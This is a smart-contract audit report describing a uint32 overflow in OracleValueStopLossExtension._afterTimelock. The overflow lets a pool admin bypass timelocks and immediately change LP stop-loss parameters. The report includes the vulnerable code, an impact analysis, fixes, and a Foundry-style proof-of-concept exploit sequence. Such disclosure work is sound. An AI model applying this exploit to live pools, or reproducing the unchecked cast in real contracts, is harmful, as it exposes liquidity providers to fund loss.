### Title
`uint32` overflow in `_afterTimelock` allows pool admin to bypass `OracleValueStopLossExtension` timelocks and immediately alter LP stop-loss parameters — (`File: metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol`)

---

### Summary

`OracleValueStopLossExtension._afterTimelock` computes the proposal deadline as `uint32(block.timestamp + timelock)`. When `timelock` is set to `type(uint32).max`, the addition overflows the `uint32` cast and wraps to a value smaller than `block.timestamp`, making every subsequent `_requireElapsed` check pass immediately. Because there is no upper-bound validation on the `timelock` parameter in either `initialize` or `proposeOracleStopLossTimelock`, a pool admin can exploit this to bypass all future timelocks and instantly apply drawdown, decay, and watermark changes that LPs rely on the timelock to delay.

---

### Finding Description

`_afterTimelock` is the single function that computes the `executeAfter` deadline for every timelocked parameter change in the extension:

```solidity
// OracleValueStopLossExtension.sol line 297-299
function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
}
```

`block.timestamp` is `uint256` (~1.75 × 10⁹ today). `timelock` is `uint32` (max 4,294,967,295). Their sum is computed in `uint256` space, then **truncated** to `uint32`. When `timelock = type(uint32).max`:

```
block.timestamp (~1,753,000,000) + 4,294,967,295 = 6,047,967,295
uint32(6,047,967,295) = 6,047,967,295 mod 4,294,967,296 ≈ 1,752,999,999
```

The stored `executeAfter` is approximately `block.timestamp − 1`. The guard:

```solidity
// line 301-303
function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert OracleStopLossTimelockNotElapsed(...);
}
```

promotes `executeAfter` to `uint256` for comparison. Since `block.timestamp ≥ block.timestamp − 1`, the revert never fires and execution proceeds immediately.

This wrapped deadline is stored in every `uint32 pendingXxxExecuteAfter` field of `PoolStopLossSchedule` and `PendingHighWatermarks.executeAfter`:

```solidity
// IOracleValueStopLossExtension.sol lines 20-34
struct PoolStopLossSchedule {
    uint32 pendingTimelock;
    uint32 pendingTimelockExecuteAfter;
    uint32 pendingDrawdownE6;
    uint32 pendingDrawdownExecuteAfter;
    uint32 pendingDecayPerSecondE8;
    uint32 pendingDecayExecuteAfter;
}
struct PendingHighWatermarks {
    uint104 token0; uint104 token1; int8 binIdx;
    uint32 executeAfter;
}
```

Neither `initialize` nor `proposeOracleStopLossTimelock` validates the timelock value:

```solidity
// initialize, lines 56-58
(uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
_validateDrawdown(drawdownE6);
_validateDecay(decayPerSecondE8);
// ← no _validateTimelock
```

```solidity
// proposeOracleStopLossTimelock, lines 78-84
function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);   // uses current timelock, not newTimelock
    sched.pendingTimelock = newTimelock;
    sched.pendingTimelockExecuteAfter = executeAfter;
    ...
}
```

---

### Impact Explanation

The `OracleValueStopLossExtension` is the sole on-chain mechanism protecting LPs from admin-driven value-loss parameter changes. Its comment explicitly states: *"Drawdown and decay changes are timelocked so LPs can react."* Once the timelock is set to `type(uint32).max`:

- **Drawdown can be set to 0 immediately** — disabling stop-loss entirely, allowing unlimited per-share value loss before any swap is blocked.
- **Decay can be set to 0 immediately** — watermarks never decay, potentially permanently blocking legitimate swaps and locking LP liquidity.
- **High watermarks can be set to extreme values immediately** — every swap triggers `OracleStopLossTriggered`, making the pool unusable and trapping LP funds.

All three outcomes constitute direct LP fund loss or broken core pool functionality (swap/liquidity flows unusable).

---

### Likelihood Explanation

The attack requires the pool admin to first set `timelock = type(uint32).max`. If the pool was created with `timelock = 0` (no initial delay), this can be done atomically in the same block as pool creation — before any LP deposits. If the pool has a non-zero initial timelock, the admin must wait that delay once, then the overflow permanently disables all future timelocks. The pool admin is semi-trusted and is explicitly in scope for admin-boundary bypass findings.

---

### Recommendation

1. **Cap the timelock** at a safe maximum (e.g., 365 days = 31,536,000 seconds, well within `uint32`) in both `initialize` and `proposeOracleStopLossTimelock`:
   ```solidity
   uint32 constant MAX_TIMELOCK = 365 days;
   function _validateTimelock(uint32 t) private pure {
       if (t > MAX_TIMELOCK) revert OracleStopLossTimelockTooLarge(t);
   }
   ```
2. **Alternatively**, store and compute `executeAfter` as `uint256` throughout, eliminating the truncation entirely.

### Proof of Concept

```solidity
// Assume pool created with timelock = 0 (no initial delay)
// Step 1: admin immediately sets timelock to type(uint32).max
vm.prank(admin);
extension.proposeOracleStopLossTimelock(pool, type(uint32).max);
// executeAfter = uint32(block.timestamp + 0) = block.timestamp → passes immediately
vm.prank(admin);
extension.executeOracleStopLossTimelock(pool);
// timelock is now type(uint32).max

// Step 2: admin proposes drawdown = 0 (disable stop-loss)
vm.prank(admin);
extension.proposeOracleStopLossDrawdown(pool, 0);
// _afterTimelock: uint32(block.timestamp + type(uint32).max) wraps to ~block.timestamp - 1
// executeAfter ≈ block.timestamp - 1 → _requireElapsed passes immediately

// Step 3: admin executes in the same block — no warp needed
vm.prank(admin);
extension.executeOracleStopLossDrawdown(pool);
// drawdownE6 is now 0; stop-loss protection is gone for all LPs
(uint32 dd,,,) = extension.oracleStopLossConfig(pool);
assertEq(dd, 0); // passes — timelock was fully bypassed
